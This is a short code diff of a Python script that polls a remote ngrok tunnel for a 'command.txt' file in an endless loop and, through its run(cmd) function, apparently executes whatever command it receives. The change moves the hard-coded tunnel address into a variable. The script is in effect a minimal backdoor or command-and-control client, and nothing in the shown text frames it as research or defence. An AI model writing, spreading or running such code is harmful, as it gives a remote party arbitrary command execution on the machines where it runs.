@@ -5,7 +5,7 @@ import time
 
 flag = True
 
-
+ip = "http://951e-147-235-193-123.ngrok.io"
 
 def getFile (url):
     payload = requests.get(url)
@@ -20,10 +20,10 @@ def run(cmd):
     return completed
 
 
-        
+
 old = ""
 while (flag):
-    payload = getFile("http://951e-147-235-193-123.ngrok.io/command.txt")
+    payload = getFile(ip+"/command.txt")
     print(str(payload))
     if(old != payload):
         old = payload
